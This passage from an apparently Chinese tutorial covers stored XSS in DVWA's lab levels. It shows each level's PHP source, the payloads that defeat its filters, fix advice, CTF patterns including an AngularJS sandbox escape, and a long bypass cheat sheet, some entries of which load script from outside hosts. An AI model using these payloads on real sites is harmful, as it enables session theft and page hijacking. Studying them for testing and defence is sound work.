class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>trim</code>过滤预定义字符(<code>\t</code>、<code>\n</code>等)，<code>mysqli_real_escape_string</code>过滤<code>'</code>、<code>"</code>、<code>\x00</code>、<code>\n</code>等</p><p>但没怎么过滤xss语句直接插入数据库中</p><p>payload：</p><p><code>&lt;script&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="medium-1">medium</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">str_replace</span>( <span class="hljs-string">&#x27;&lt;script&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;script&gt;</code></p><p>payload：</p><p><code>&lt;ScRiPt&gt;alert(/xss/)&lt;/script&gt;</code></p><h4 id="high-1">high</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">strip_tags</span>( <span class="hljs-title function_ invoke__">addslashes</span>( <span class="hljs-variable">$message</span> ) );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">preg_replace</span>( <span class="hljs-string">&#x27;/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#x27;<span class="hljs-subst">$message</span>&#x27;, &#x27;<span class="hljs-subst">$name</span>&#x27; );&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );<br><br>    <span class="hljs-comment">//mysql_close();</span><br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>对<code>$message</code>做了<code>htmlspecialchars()</code>限制，但是对<code>$name</code>未作过多的限制，只使用了<code>str_replace()</code>过滤字符<code>&lt;</code>、<code>s</code>、<code>c</code>、<code>r</code>、<code>i</code>、<code>p</code>、<code>t</code>、<code>&gt;</code></p><p>payload：</p><p><code>&lt;img src=x onerror=alert(1)&gt;</code></p><h4 id="impossible-1">impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;btnSign&#x27;</span> ] ) ) &#123;<br>    <span class="hljs-comment">// Check Anti-CSRF token</span><br>    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );<br><br>    <span class="hljs-comment">// Get input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;mtxMessage&#x27;</span> ] );<br>    <span class="hljs-variable">$name</span>    = <span class="hljs-title function_ invoke__">trim</span>( <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;txtName&#x27;</span> ] );<br><br>    <span class="hljs-comment">// Sanitize message input</span><br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$message</span> );<br>    <span class="hljs-variable">$message</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$message</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$message</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$message</span> );<br><br>    <span class="hljs-comment">// Sanitize name input</span><br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$name</span> );<br>    <span class="hljs-variable">$name</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$name</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));<br>    <span class="hljs-variable">$name</span> = <span class="hljs-title function_ invoke__">htmlspecialchars</span>( <span class="hljs-variable">$name</span> );<br><br>    <span class="hljs-comment">// Update database</span><br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">prepare</span>( <span class="hljs-string">&#x27;INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );&#x27;</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:message&#x27;</span>, <span class="hljs-variable">$message</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">bindParam</span>( <span class="hljs-string">&#x27;:name&#x27;</span>, <span class="hljs-variable">$name</span>, PDO::<span class="hljs-variable constant_">PARAM_STR</span> );<br>    <span class="hljs-variable">$data</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<br><br><span class="hljs-comment">// Generate Anti-CSRF token</span><br><span class="hljs-title function_ invoke__">generateSessionToken</span>();<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>两个参数都用了<code>htmlspecialchars()</code>和<code>mysql_real_escape_string()</code>安全</p><h2 id="漏洞修复">漏洞修复</h2><ol type="1"><li>用户端的输入</li></ol><p>输入过滤 推荐白名单，不推荐黑名单，在服务端做。</p><ol start="2" type="1"><li>用户端的输出</li></ol><p>输出过滤(重点) 推荐HTML编码和JS转义。</p><h2 id="常见xss题型">常见XSS题型</h2><ol type="1"><li>无过滤</li></ol><p><code>?a=&lt;script&gt;alert(1)&lt;/script&gt;</code></p><ol start="2" type="1"><li>escape()函数过滤</li></ol><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">a</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>escape(a)<br></code></pre></td></tr></table></figure><p><code>?a=';alert(1);//或?a=';alert(1);'</code></p><ol start="3" type="1"><li>javascript重定向与伪链接</li></ol><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">location.href</span>=a<br></code></pre></td></tr></table></figure><p><code>?a=javascript:alert(1)</code></p><ol start="4" type="1"><li>AngularJS沙箱绕过</li></ol><p>如果使用了AngularJS框架（version1.2-1.5）如果payload：?a=4传回值4，说明可能存在XSS构造payload：<code>&#123;&#123;'a'.constructor.prototype.charAt=[].join;$eval('x=1&#125; &#125; &#125;;alert(1)//');&#125;&#125;</code></p><ol start="5" type="1"><li>bypass_csp</li></ol><p>参考https://xz.aliyun.com/t/9254#toc-6</p><h2 id="xss语句">xss语句</h2><h3 id="弹窗函数">弹窗函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs Plain">alert()<br>confirm()<br>prompt()<br></code></pre></td></tr></table></figure><h3 id="一些绕过方法">一些绕过方法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs Plain">&lt;img src=1 οnerrοr=alert(1)&gt;<br>&lt;script&gt;alert(1)&lt;/script&gt;<br>&lt;script&gt;alert(/1/)&lt;/script&gt;<br>&quot;/&gt;&lt;svg/οnlοad=prompt(/1/);&gt;<br>&lt;input id=&quot;aaa&quot; type=&quot;text&quot; value=&quot;输出点&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;img src=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&gt;&quot;&#x27;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;table background=&#x27;javascript.:alert(([code])&#x27;&gt;&lt;/table&gt;<br>&lt;object type=text/html data=&#x27;javascript.:alert(([code]);&#x27;&gt;&lt;/object&gt;<br>&quot;+alert(&#x27;XSS&#x27;)+&quot;<br>&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>=&#x27;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(document.cookie)&lt;/script&gt;<br>&lt;script&gt;alert(vulnerable)&lt;/script&gt;<br>&lt;s&amp;#99;ript&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;<br>&lt;img src=&quot;javas&amp;#99;ript:alert(&#x27;XSS&#x27;)&quot;&gt;<br>%0a%0a&lt;script&gt;alert(\&quot;Vulnerable\&quot;)&lt;/script&gt;.jsp<br>%3c/a%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3c/title%3e%3cscript%3ealert(%22xss%22)%3c/script%3e<br>%3cscript%3ealert(%22xss%22)%3c/script%3e/index.html<br>&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>a.jsp/&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&quot;&gt;&lt;script&gt;alert(&#x27;Vulnerable&#x27;)&lt;/script&gt;<br>&lt;IMG SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&#x27;XSS&#x27;)&gt;<br>&lt;IMG src=&quot;/JaVaScRiPt.:alert&quot;(&amp;quot;XSS&amp;quot;)&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x09;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0A;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&quot;jav&amp;#x0D;ascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&quot;&lt;IMG src=&quot;/java&quot;\0script.:alert(\&quot;XSS\&quot;)&gt;&quot;;&#x27;&gt;out<br>&lt;IMG SRC=&quot; javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;SCRIPT&gt;a=/XSS/alert(a.source)&lt;/SCRIPT&gt;<br>&lt;BODY BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BODY ONLOAD=alert(&#x27;XSS&#x27;)&gt;<br>&lt;IMG DYNSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;IMG LOWSRC=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;BGSOUND SRC=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;br size=&quot;&amp;&#123;alert(&#x27;XSS&#x27;)&#125;&quot;&gt;<br>&lt;LAYER SRC=&quot;http://xss.ha.ckers.org/a.js&quot;&gt;&lt;/layer&gt;<br>&lt;LINK REL=&quot;stylesheet&quot;HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IMG SRC=&#x27;vbscript.:msgbox(&quot;XSS&quot;)&#x27;&gt;<br>&lt;META. HTTP-EQUIV=&quot;refresh&quot;CONTENT=&quot;0;url=javascript.:alert(&#x27;XSS&#x27;);&quot;&gt;<br>&lt;IFRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/IFRAME&gt;<br>&lt;FRAMESET&gt;&lt;FRAME. src=&quot;/javascript.:alert&quot;(&#x27;XSS&#x27;)&gt;&lt;/FRAME&gt;&lt;/FRAMESET&gt;<br>&lt;TABLE BACKGROUND=&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;&gt;<br>&lt;DIV STYLE=&quot;background-image: url(javascript.:alert(&#x27;XSS&#x27;))&quot;&gt;<br>&lt;DIV STYLE=&quot;behaviour: url(&#x27;http://www.how-to-hack.org/exploit.html&amp;#39;);&quot;&gt;<br>&lt;DIV STYLE=&quot;width: expression(alert(&#x27;XSS&#x27;));&quot;&gt;<br>&lt;STYLE&gt;@im\port&#x27;\ja\vasc\ript:alert(&quot;XSS&quot;)&#x27;;&lt;/STYLE&gt;<br>&lt;IMG STYLE=&#x27;xss:expre\ssion(alert(&quot;XSS&quot;))&#x27;&gt;<br>&lt;STYLE. TYPE=&quot;text/javascript&quot;&gt;alert(&#x27;XSS&#x27;);&lt;/STYLE&gt;<br>&lt;STYLE. TYPE=&quot;text/css&quot;&gt;.XSS&#123;background-image:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;<br>&lt;STYLE. type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript.:alert(&#x27;XSS&#x27;)&quot;)&#125;&lt;/STYLE&gt;<br>&lt;BASE HREF=&quot;javascript.:alert(&#x27;XSS&#x27;);//&quot;&gt;<br></code></pre></td></tr></table></figure><h2 id="特殊利用">特殊利用</h2><p>获取Cookie</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">alert</span><span 